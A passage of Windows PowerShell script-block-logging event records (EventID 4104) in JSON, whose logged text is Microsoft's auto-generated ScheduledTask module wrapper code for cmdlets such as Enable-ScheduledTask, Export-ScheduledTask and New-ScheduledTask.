${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('EnableByName', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('EnableByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Enable-ScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction Export-ScheduledTask\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([System.String])][OutputType([System.String])]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Name', Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Name', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=0, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Name') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletizatio",
    "ScriptBlockId": "97e25639-7cba-4b4f-a31d-9b0148eac352",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.991229Z"
    },
    "EventRecordID": 26,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-17A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 3,
    "MessageTotal": 19,
    "ScriptBlockText": "n.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'System.String'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('ExportByName', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'System.String'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('ExportByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Export-ScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction Get-ScheduledTaskInfo\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskDynamicInfo')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskDynamicInfo')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Name', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Name', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=0, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Name')]\r\n    [Parameter(ParameterSetName='Object')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Name') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskDynamicInfo'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('GetInfoByName', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{N",
    "ScriptBlockId": "97e25639-7cba-4b4f-a31d-9b0148eac352",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.991250Z"
    },
    "EventRecordID": 27,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-17A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 4,
    "MessageTotal": 19,
    "ScriptBlockText": "ame = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskDynamicInfo'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('GetInfoByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-ScheduledTaskInfo' -Alias '*'\r\n        \r\n\r\nfunction New-ScheduledTask\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='New0', Position=0)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Action},\r\n\r\n    [Parameter(ParameterSetName='New0', Position=4)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Description},\r\n\r\n    [Parameter(ParameterSetName='New0', Position=3)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${Principal},\r\n\r\n    [Parameter(ParameterSetName='New0', Position=2)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${Settings},\r\n\r\n    [Parameter(ParameterSetName='New0', Position=1)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Trigger},\r\n\r\n    [Parameter(ParameterSetName='New0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='New0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='New0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Action')) {\r\n          [object]$__cmdletization_value = ${Action}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Description')) {\r\n          [object]$__cmdletization_value = ${Description}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Principal')) {\r\n          [object]$__cmdletization_value = ${Principal}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Principal'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Principal'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskPrincipal'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        